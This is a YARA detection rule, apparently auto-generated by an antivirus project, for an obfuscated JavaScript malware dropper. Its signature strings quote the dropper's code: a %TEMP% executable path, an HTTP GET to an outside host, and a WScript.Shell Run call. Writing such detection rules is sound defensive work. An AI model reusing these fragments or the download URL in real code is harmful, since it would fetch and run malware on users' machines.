rule sig_20160328_48c12d7877a0c2146599c409b80194b3 {
  meta:
    description = "datamaliciousorder - file 20160328_48c12d7877a0c2146599c409b80194b3.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c073cff524c7d4f0448d22216abe680512ef8c7312fc8719c9a8f357eaaa3541"

  strings:
    $s1  = "function Nkfjb() {return Xaehgtyd[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"5F8ZXATe.exe\";};" fullword ascii
    $s2  = "Ffnfmtkbc[Lifwym](\"GET\", \"http://portal.ofar.com.br/o4psaf\", false);" fullword ascii
    $s3  = "do {WScript[Aczece](Ebqlrci() * 11)} while (Ffnfmtkbc[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Xaehgtyd = function Ndeyasdopl() {return WScript[Rbqua](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Fpogdtnraf(Hdnbu, Tsttst){return Hdnbu - Tsttst;};" fullword ascii
    $s6  = "function Yrxmqwh(Gmofrbgz){Xaehgtyd[\"Run\"](Gmofrbgz, Stpim, Stpim);};" fullword ascii
    $s7  = "function Lllbtb() {return ((Jkrnbsyf == true) && (Jkrnbsyf == Rjyqonqow)) ? 1 : Stpim;};" fullword ascii
    $s8  = "function Tokeixkqii(){return Ubbvoynb;};" fullword ascii
    $s9  = "return Fpogdtnraf(Mvkxdqdorb, Qjyyx);" fullword ascii
    $s10 = "function Ebqlrci(){return 22;};" fullword ascii
    $s11 = "Jkrnbsyf = true; " fullword ascii
    $s12 = "function Wcpto(Duegsybh) {var Zipxqitib = (1, 2, 3, 4, 5, Duegsybh); return Zipxqitib;};" fullword ascii
    $s13 = "function Dgmqzrmjc()" fullword ascii
    $s14 = "var Znfpkyoxx = false;" fullword ascii
    $s15 = "var Jkrnbsyf = false;" fullword ascii
    $s16 = " while (Mpcgiw){" fullword ascii
    $s17 = "function Rldphb(){return Rbqua;};" fullword ascii
    $s18 = "var Ygyyc = new this[\"Date\"]();" fullword ascii
    $s19 = "Rjyqonqow = true; " fullword ascii
    $s20 = "var Rjyqonqow = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}